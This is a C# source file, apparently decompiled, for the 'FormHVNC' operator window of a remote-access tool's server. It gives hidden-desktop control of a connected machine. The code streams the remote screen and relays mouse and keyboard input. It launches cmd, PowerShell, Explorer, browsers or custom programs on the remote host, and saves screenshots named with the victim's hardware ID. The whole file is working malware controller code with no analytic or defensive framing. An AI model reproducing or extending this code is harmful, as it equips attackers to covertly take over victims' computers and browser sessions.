using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using CustomControls.RJControls;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormHVNC : FormMaterial
{
	public int FPS;

	public Stopwatch sw = Stopwatch.StartNew();

	private List<Keys> _keysPressed = new List<Keys>();

	public Size screen;

	public Clients client;

	public Clients parrent;

	private Point point2 = new Point(0, 0);

	private const int threshold = 15;

	private IContainer components;

	public MaterialSwitch materialSwitch1;

	public PictureBox pictureBox1;

	private Panel panel1;

	public Timer timer1;

	private ContextMenuStrip contextMenuStrip1;

	private ToolStripMenuItem runToolStripMenuItem;

	private ToolStripMenuItem cmdToolStripMenuItem;

	private ToolStripMenuItem powerShellToolStripMenuItem;

	private ToolStripMenuItem edgeToolStripMenuItem;

	private ToolStripMenuItem chromeToolStripMenuItem;

	private ToolStripMenuItem yandexToolStripMenuItem;

	private ToolStripMenuItem firefoxToolStripMenuItem;

	private ToolStripMenuItem operaToolStripMenuItem;

	private ToolStripMenuItem operaGXToolStripMenuItem;

	private ToolStripMenuItem explorerToolStripMenuItem;

	private MaterialLabel materialLabel1;

	private ToolStripMenuItem customToolStripMenuItem;

	public RJComboBox rjComboBox1;

	private NumericUpDown numericUpDown2;

	private MaterialButton materialButton2;

	private MaterialButton materialButton1;

	public FormHVNC()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void FormDesktop_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		timer1.Start();
		pictureBox1.MouseMove += pictureBox1_MouseMove;
		pictureBox1.MouseDown += pictureBox1_MouseDown;
		pictureBox1.MouseUp += pictureBox1_MouseUp;
		pictureBox1.MouseDoubleClick += pictureBox1_MouseDoubleClick;
		pictureBox1.MouseWheel += pictureBox1_MouseWheel;
		base.KeyPreview = true;
		base.AcceptButton = null;
		pictureBox1.Focus();
		base.KeyDown += FormRemoteDesktop_KeyDown;
		base.KeyUp += FormRemoteDesktop_KeyUp;
		materialButton1.Click += materialButton1_Click;
		materialButton2.Click += materialButton2_Click;
		rjComboBox1.OnSelectedIndexChanged += rjComboBox1_OnSelectedIndexChanged;
		rjComboBox1.Items.Clear();
		rjComboBox1.Items.AddRange(new object[10] { "Cmd", "Powershell", "Edge", "Chrome", "Yandex", "FireFox", "Opera", "OperaGX", "Explorer", "Custom" });
		rjComboBox1.SelectedIndex = 0;
	}

	private void ChangeScheme(object sender)
	{
		Color primary = FormMaterial.PrimaryColor;
		bool num = MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK;
		Color back = (num ? Color.FromArgb(40, 40, 40) : Color.White);
		Color editBack = (num ? Color.FromArgb(40, 40, 40) : Color.White);
		Color text = (num ? Color.WhiteSmoke : Color.Black);
		BackColor = back;
		panel1.BackColor = back;
		numericUpDown2.BackColor = editBack;
		numericUpDown2.ForeColor = primary;
		rjComboBox1.BorderColor = primary;
		rjComboBox1.IconColor = primary;
		rjComboBox1.BackColor = editBack;
		rjComboBox1.ForeColor = text;
		rjComboBox1.ListBackColor = editBack;
		rjComboBox1.ListTextColor = text;
		materialButton1.ForeColor = text;
		materialButton2.ForeColor = text;
	}

	private void Closing1(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Disconnect();
		}
	}

	private void materialSwitch1_CheckedChanged(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			if (materialSwitch1.Checked)
			{
				client.Send(LEB128.Write(new object[3]
				{
					"Capture",
					true,
					(byte)numericUpDown2.Value
				}));
			}
			else
			{
				client.Send(LEB128.Write(new object[2] { "Capture", false }));
			}
		}
	}

	private void numericUpDown2_ValueChanged(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect && materialSwitch1.Checked)
		{
			client.Send(LEB128.Write(new object[2]
			{
				"Quality",
				(byte)numericUpDown2.Value
			}));
		}
	}

	private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (!pictureBox1.Focused)
			{
				pictureBox1.Focus();
			}
			if (materialSwitch1.Checked)
			{
				Point point = new Point(e.X * screen.Width / pictureBox1.Width, e.Y * screen.Height / pictureBox1.Height);
				byte b = 0;
				if (e.Button == MouseButtons.Left)
				{
					b = 2;
				}
				if (e.Button == MouseButtons.Right)
				{
					b = 8;
				}
				client.Send(LEB128.Write(new object[4] { "MouseClick", b, point.X, point.Y }));
			}
		}
		catch
		{
		}
	}

	private void pictureBox1_MouseUp(object sender, MouseEventArgs e)
	{
		try
		{
			if (materialSwitch1.Checked)
			{
				Point point = new Point(e.X * screen.Width / pictureBox1.Width, e.Y * screen.Height / pictureBox1.Height);
				byte b = 0;
				if (e.Button == MouseButtons.Left)
				{
					b = 4;
				}
				if (e.Button == MouseButtons.Right)
				{
					b = 16;
				}
				client.Send(LEB128.Write(new object[4] { "MouseClick", b, point.X, point.Y }));
			}
		}
		catch
		{
		}
	}

	private void pictureBox1_MouseDoubleClick(object sender, MouseEventArgs e)
	{
		try
		{
			if (materialSwitch1.Checked)
			{
				Point point = new Point(e.X * screen.Width / pictureBox1.Width, e.Y * screen.Height / pictureBox1.Height);
				client.Send(LEB128.Write(new object[3] { "MouseDoubleClick", point.X, point.Y }));
			}
		}
		catch
		{
		}
	}

	private void pictureBox1_MouseWheel(object sender, MouseEventArgs e)
	{
		try
		{
			if (materialSwitch1.Checked)
			{
				if (e.Delta > 0)
				{
					client.Send(LEB128.Write(new object[2] { "MouseWheel", true }));
				}
				else
				{
					client.Send(LEB128.Write(new object[2] { "MouseWheel", false }));
				}
			}
		}
		catch
		{
		}
	}

	private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
	{
		try
		{
			if (materialSwitch1.Checked)
			{
				Point point = new Point(e.X * screen.Width / pictureBox1.Width, e.Y * screen.Height / pictureBox1.Height);
				if (Math.Abs(point.X - point2.X) >= 15 || Math.Abs(point.Y - point2.Y) >= 15)
				{
					point2 = point;
					client.Send(LEB128.Write(new object[3] { "MouseMove", point.X, point.Y }));
				}
			}
		}
		catch
		{
		}
	}

	private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
	{
		if (!materialSwitch1.Checked)
		{
			return;
		}
		Control focusedControl = base.ActiveControl;
		if (focusedControl != null && (focusedControl is TextBox || focusedControl is ComboBox || focusedControl is NumericUpDown || focusedControl is Button || focusedControl == rjComboBox1 || (focusedControl.Parent != null && focusedControl.Parent == panel1)))
		{
			if (e.KeyCode == Keys.Return)
			{
				_ = rjComboBox1;
			}
			return;
		}
		if (!IsLockKey(e.KeyCode))
		{
			e.Handled = true;
		}
		if (!_keysPressed.Contains(e.KeyCode))
		{
			_keysPressed.Add(e.KeyCode);
			client.Send(LEB128.Write(new object[3]
			{
				"KeyboardClick",
				true,
				(int)e.KeyCode
			}));
		}
	}

	private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
	{
		if (!materialSwitch1.Checked)
		{
			return;
		}
		Control focusedControl = base.ActiveControl;
		if (focusedControl == null || (!(focusedControl is TextBox) && !(focusedControl is ComboBox) && !(focusedControl is NumericUpDown) && !(focusedControl is Button) && focusedControl != rjComboBox1 && (focusedControl.Parent == null || focusedControl.Parent != panel1)))
		{
			if (!IsLockKey(e.KeyCode))
			{
				e.Handled = true;
			}
			_keysPressed.Remove(e.KeyCode);
			client.Send(LEB128.Write(new object[3]
			{
				"KeyboardClick",
				false,
				(int)e.KeyCode
			}));
		}
	}

	private bool IsLockKey(Keys key)
	{
		if ((key & Keys.Capital) != Keys.Capital && (key & Keys.NumLock) != Keys.NumLock)
		{
			return (key & Keys.Scroll) == Keys.Scroll;
		}
		return true;
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (!parrent.itsConnect)
		{
			Close();
		}
		if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	private void cmdToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (client == null || !client.itsConnect)
		{
			MessageBox.Show("Client is not connected.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			return;
		}
		client.Send(LEB128.Write(new object[2] { "Run", "Cmd" }));
	}

	private void powerShellToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (client == null || !client.itsConnect)
		{
			MessageBox.Show("Client is not connected.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			return;
		}
		client.Send(LEB128.Write(new object[2] { "Run", "Powershell" }));
	}

	private void edgeToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (client == null || !client.itsConnect)
		{
			MessageBox.Show("Client is not connected.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			return;
		}
		client.Send(LEB128.Write(new object[2] { "Run", "Edge" }));
	}

	private void chromeToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (client == null || !client.itsConnect)
		{
			MessageBox.Show("Client is not connected.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			return;
		}
		client.Send(LEB128.Write(new object[2] { "Run", "Chrome" }));
	}

	private void yandexToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (client == null || !client.itsConnect)
		{
			MessageBox.Show("Client is not connected.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			return;
		}
		client.Send(LEB128.Write(new object[2] { "Run", "Yandex" }));
	}

	private void firefoxToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (client == null || !client.itsConnect)
		{
			MessageBox.Show("Client is not connected.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			return;
		}
		client.Send(LEB128.Write(new object[2] { "Run", "FireFox" }));
	}

	private void operaToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (client == null || !client.itsConnect)
		{
			MessageBox.Show("Client is not connected.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			return;
		}
		client.Send(LEB128.Write(new object[2] { "Run", "Opera" }));
	}

	private void operaGXToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (client == null || !client.itsConnect)
		{
			MessageBox.Show("Client is not connected.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			return;
		}
		client.Send(LEB128.Write(new object[2] { "Run", "OperaGX" }));
	}

	private void explorerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (client == null || !client.itsConnect)
		{
			MessageBox.Show("Client is not connected.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			return;
		}
		client.Send(LEB128.Write(new object[2] { "Run", "Explorer" }));
	}

	private void customToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (client == null || !client.itsConnect)
		{
			MessageBox.Show("Client is not connected.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			return;
		}
		FormHVNCrun formHVNCrun = new FormHVNCrun();
		formHVNCrun.ShowDialog();
		if (formHVNCrun.Run)
		{
			client.Send(LEB128.Write(new object[3]
			{
				"RunCustom",
				formHVNCrun.rjTextBox1.Texts,
				formHVNCrun.rjTextBox2.Texts
			}));
		}
	}

	private void materialButton1_Click(object sender, EventArgs e)
	{
		try
		{
			if (pictureBox1.Image == null)
			{
				MessageBox.Show("No image available to save.", "Screenshot", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				return;
			}
			string downloadsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
			if (!Directory.Exists(downloadsPath))
			{
				downloadsPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
			}
			string fileName = string.Format("HVNC_Screenshot_{0}_{1}.png", (client != null) ? client.Hwid : "Unknown", DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss"));
			string filePath = Path.Combine(downloadsPath, fileName);
			using (Bitmap bitmap = new Bitmap(pictureBox1.Image))
			{
				bitmap.Save(filePath, ImageFormat.Png);
			}
			MessageBox.Show($"Screenshot saved successfully!\n\nPath: {filePath}", "Screenshot", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}
		catch (Exception ex)
		{
			MessageBox.Show($"Error saving screenshot:\n{ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private void materialButton2_Click(object sender, EventArgs e)
	{
		if (client == null || !client.itsConnect)
		{
			MessageBox.Show("Client is not connected.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			return;
		}
		if (rjComboBox1.SelectedIndex < 0)
		{
			MessageBox.Show("Please select an application.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			return;
		}
		string selectedApp = rjComboBox1.SelectedItem?.ToString();
		if (string.IsNullOrEmpty(selectedApp))
		{
			return;
		}
		if (selectedApp == "Custom")
		{
			FormHVNCrun formHVNCrun = new FormHVNCrun();
			formHVNCrun.ShowDialog();
			if (formHVNCrun.Run)
			{
				client.Send(LEB128.Write(new object[3]
				{
					"RunCustom",
					formHVNCrun.rjTextBox1.Texts,
					formHVNCrun.rjTextBox2.Texts
				}));
			}
		}
		else
		{
			string appName = selectedApp;
			if (selectedApp == "Firefox")
			{
				appName = "FireFox";
			}
			client.Send(LEB128.Write(new object[2] { "Run", appName }));
		}
	}

	private void rjComboBox1_OnSelectedIndexChanged(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.materialSwitch1 = new MaterialSkin.Controls.MaterialSwitch();
		this.pictureBox1 = new System.Windows.Forms.PictureBox();
		this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.runToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.cmdToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.powerShellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.edgeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.chromeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.yandexToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.firefoxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.operaToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.operaGXToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.explorerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.customToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.numericUpDown2 = new System.Windows.Forms.NumericUpDown();
		this.panel1 = new System.Windows.Forms.Panel();
		this.materialButton2 = new MaterialSkin.Controls.MaterialButton();
		this.materialButton1 = new MaterialSkin.Controls.MaterialButton();
		this.rjComboBox1 = new CustomControls.RJControls.RJComboBox();
		this.materialLabel1 = new MaterialSkin.Controls.MaterialLabel();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
		this.contextMenuStrip1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.numericUpDown2).BeginInit();
		this.panel1.SuspendLayout();
		base.SuspendLayout();
		this.materialSwitch1.AutoSize = true;
		this.materialSwitch1.Depth = 0;
		this.materialSwitch1.Enabled = false;
		this.materialSwitch1.Location = new System.Drawing.Point(3, 64);
		this.materialSwitch1.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch1.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch1.Name = "materialSwitch1";
		this.materialSwitch1.Ripple = true;
		this.materialSwitch1.Size = new System.Drawing.Size(92, 37);
		this.materialSwitch1.TabIndex = 0;
		this.materialSwitch1.Text = "Start";
		this.materialSwitch1.UseVisualStyleBackColor = true;
		this.materialSwitch1.CheckedChanged += new System.EventHandler(materialSwitch1_CheckedChanged);
		this.pictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.pictureBox1.Location = new System.Drawing.Point(6, 104);
		this.pictureBox1.Name = "pictureBox1";
		this.pictureBox1.Size = new System.Drawing.Size(888, 427);
		this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.pictureBox1.TabIndex = 4;
		this.pictureBox1.TabStop = false;
		this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.runToolStripMenuItem });
		this.contextMenuStrip1.Name = "contextMenuStrip1";
		this.contextMenuStrip1.Size = new System.Drawing.Size(96, 26);
		this.runToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[10] { this.cmdToolStripMenuItem, this.powerShellToolStripMenuItem, this.edgeToolStripMenuItem, this.chromeToolStripMenuItem, this.yandexToolStripMenuItem, this.firefoxToolStripMenuItem, this.operaToolStripMenuItem, this.operaGXToolStripMenuItem, this.explorerToolStripMenuItem, this.customToolStripMenuItem });
		this.runToolStripMenuItem.Name = "runToolStripMenuItem";
		this.runToolStripMenuItem.Size = new System.Drawing.Size(95, 22);
		this.runToolStripMenuItem.Text = "Run";
		this.cmdToolStripMenuItem.Name = "cmdToolStripMenuItem";
		this.cmdToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
		this.cmdToolStripMenuItem.Text = "Cmd";
		this.cmdToolStripMenuItem.Click += new System.EventHandler(cmdToolStripMenuItem_Click);
		this.powerShellToolStripMenuItem.Name = "powerShellToolStripMenuItem";
		this.powerShellToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
		this.powerShellToolStripMenuItem.Text = "PowerShell";
		this.powerShellToolStripMenuItem.Click += new System.EventHandler(powerShellToolStripMenuItem_Click);
		this.edgeToolStripMenuItem.Name = "edgeToolStripMenuItem";
		this.edgeToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
		this.edgeToolStripMenuItem.Text = "Edge";
		this.edgeToolStripMenuItem.Click += new System.EventHandler(edgeToolStripMenuItem_Click);
		this.chromeToolStripMenuItem.Name = "chromeToolStripMenuItem";
		this.chromeToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
		this.chromeToolStripMenuItem.Text = "Chrome";
		this.chromeToolStripMenuItem.Click += new System.EventHandler(chromeToolStripMenuItem_Click);
		this.yandexToolStripMenuItem.Name = "yandexToolStripMenuItem";
		this.yandexToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
		this.yandexToolStripMenuItem.Text = "Yandex";
		this.yandexToolStripMenuItem.Click += new System.EventHandler(yandexToolStripMenuItem_Click);
		this.firefoxToolStripMenuItem.Name = "firefoxToolStripMenuItem";
		this.firefoxToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
		this.firefoxToolStripMenuItem.Text = "FireFox";
		this.firefoxToolStripMenuItem.Click += new System.EventHandler(firefoxToolStripMenuItem_Click);
		this.operaToolStripMenuItem.Name = "operaToolStripMenuItem";
		this.operaToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
		this.operaToolStripMenuItem.Text = "Opera";
		this.operaToolStripMenuItem.Click += new System.EventHandler(operaToolStripMenuItem_Click);
		this.operaGXToolStripMenuItem.Name = "operaGXToolStripMenuItem";
		this.operaGXToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
		this.operaGXToolStripMenuItem.Text = "OperaGX";
		this.operaGXToolStripMenuItem.Click += new System.EventHandler(operaGXToolStripMenuItem_Click);
		this.explorerToolStripMenuItem.Name = "explorerToolStripMenuItem";
		this.explorerToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
		this.explorerToolStripMenuItem.Text = "Explorer";
		this.explorerToolStripMenuItem.Click += new System.EventHandler(explorerToolStripMenuItem_Click);
		this.customToolStripMenuItem.Name = "customToolStripMenuItem";
		this.customToolStripMenuItem.Size = new System.Drawing.Size(132, 22);
		this.customToolStripMenuItem.Text = "Custom";
		this.customToolStripMenuItem.Click += new System.EventHandler(customToolStripMenuItem_Click);
		this.numericUpDown2.BackColor = System.Drawing.SystemColors.Window;
		this.numericUpDown2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.numericUpDown2.ForeColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.numericUpDown2.Location = new System.Drawing.Point(112, 73);
		this.numericUpDown2.Margin = new System.Windows.Forms.Padding(2);
		this.numericUpDown2.Name = "numericUpDown2";
		this.numericUpDown2.Size = new System.Drawing.Size(42, 20);
		this.numericUpDown2.TabIndex = 19;
		this.numericUpDown2.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.numericUpDown2.UpDownAlign = System.Windows.Forms.LeftRightAlignment.Left;
		this.numericUpDown2.Value = new decimal(new int[4] { 80, 0, 0, 0 });
		this.numericUpDown2.ValueChanged += new System.EventHandler(numericUpDown2_ValueChanged);
		this.panel1.Controls.Add(this.materialButton2);
		this.panel1.Controls.Add(this.materialButton1);
		this.panel1.Controls.Add(this.rjComboBox1);
		this.panel1.Controls.Add(this.materialLabel1);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel1.Location = new System.Drawing.Point(3, 64);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(894, 470);
		this.panel1.TabIndex = 20;
		this.materialButton2.AutoSize = false;
		this.materialButton2.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
		this.materialButton2.Density = MaterialSkin.Controls.MaterialButton.MaterialButtonDensity.Default;
		this.materialButton2.Depth = 0;
		this.materialButton2.HighEmphasis = true;
		this.materialButton2.Icon = null;
		this.materialButton2.Location = new System.Drawing.Point(655, 4);
		this.materialButton2.Margin = new System.Windows.Forms.Padding(4, 6, 4, 6);
		this.materialButton2.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialButton2.Name = "materialButton2";
		this.materialButton2.NoAccentTextColor = System.Drawing.Color.Empty;
		this.materialButton2.Size = new System.Drawing.Size(66, 30);
		this.materialButton2.TabIndex = 28;
		this.materialButton2.Text = "RUN";
		this.materialButton2.Type = MaterialSkin.Controls.MaterialButton.MaterialButtonType.Contained;
		this.materialButton2.UseAccentColor = false;
		this.materialButton2.UseVisualStyleBackColor = true;
		this.materialButton1.AutoSize = false;
		this.materialButton1.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
		this.materialButton1.Density = MaterialSkin.Controls.MaterialButton.MaterialButtonDensity.Default;
		this.materialButton1.Depth = 0;
		this.materialButton1.HighEmphasis = true;
		this.materialButton1.Icon = null;
		this.materialButton1.Location = new System.Drawing.Point(729, 4);
		this.materialButton1.Margin = new System.Windows.Forms.Padding(4, 6, 4, 6);
		this.materialButton1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialButton1.Name = "materialButton1";
		this.materialButton1.NoAccentTextColor = System.Drawing.Color.Empty;
		this.materialButton1.Size = new System.Drawing.Size(161, 30);
		this.materialButton1.TabIndex = 27;
		this.materialButton1.Text = "SCREENSHOT";
		this.materialButton1.Type = MaterialSkin.Controls.MaterialButton.MaterialButtonType.Contained;
		this.materialButton1.UseAccentColor = false;
		this.materialButton1.UseVisualStyleBackColor = true;
		this.rjComboBox1.BackColor = System.Drawing.SystemColors.Window;
		this.rjComboBox1.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox1.BorderSize = 1;
		this.rjComboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDown;
		this.rjComboBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.rjComboBox1.ForeColor = System.Drawing.Color.DimGray;
		this.rjComboBox1.IconColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox1.ListBackColor = System.Drawing.SystemColors.Window;
		this.rjComboBox1.ListTextColor = System.Drawing.Color.DimGray;
		this.rjComboBox1.Location = new System.Drawing.Point(266, 4);
		this.rjComboBox1.MinimumSize = new System.Drawing.Size(200, 30);
		this.rjComboBox1.Name = "rjComboBox1";
		this.rjComboBox1.Padding = new System.Windows.Forms.Padding(1);
		this.rjComboBox1.Size = new System.Drawing.Size(382, 30);
		this.rjComboBox1.TabIndex = 25;
		this.rjComboBox1.Texts = "";
		this.materialLabel1.AutoSize = true;
		this.materialLabel1.ContextMenuStrip = this.contextMenuStrip1;
		this.materialLabel1.Depth = 0;
		this.materialLabel1.Font = new System.Drawing.Font("Roboto", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.materialLabel1.Location = new System.Drawing.Point(161, 10);
		this.materialLabel1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialLabel1.Name = "materialLabel1";
		this.materialLabel1.Size = new System.Drawing.Size(99, 19);
		this.materialLabel1.TabIndex = 0;
		this.materialLabel1.Text = "Context Menu";
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(900, 537);
		base.Controls.Add(this.numericUpDown2);
		base.Controls.Add(this.pictureBox1);
		base.Controls.Add(this.materialSwitch1);
		base.Controls.Add(this.panel1);
		base.DrawerUseColors = true;
		base.Name = "FormHVNC";
		this.Text = "HVNC";
		base.Load += new System.EventHandler(FormDesktop_Load);
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
		this.contextMenuStrip1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.numericUpDown2).EndInit();
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
